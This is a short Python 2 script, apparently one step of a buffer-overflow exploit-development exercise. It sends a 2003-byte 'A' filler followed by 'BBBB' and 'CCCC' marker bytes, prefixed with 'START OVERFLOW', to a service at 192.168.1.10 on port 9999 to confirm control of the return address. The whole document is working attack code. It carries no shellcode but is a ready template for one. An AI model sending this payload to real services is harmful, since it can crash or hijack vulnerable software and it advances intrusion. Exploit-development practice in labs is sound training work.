#!/usr/bin/python 
import socket 
import time 
import sys

#Third step: take the offset values and use in filler, to verify

try:

	filler = "A" * 2003 #change the size
	retn = "BBBB"
	offset = "CCCC"

	buffer = filler + retn + offset

	inputBuffer = "START OVERFLOW" + buffer + "\r\n"

	print "Sending evil buffer with %s bytes\n" % len(inputBuffer)

	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  	#change ip and port
	s.connect(("192.168.1.10", 9999))
	s.send(inputBuffer)

	s.close()
	print "Done!"

except:
	print "Could not connect!"
	sys.exit()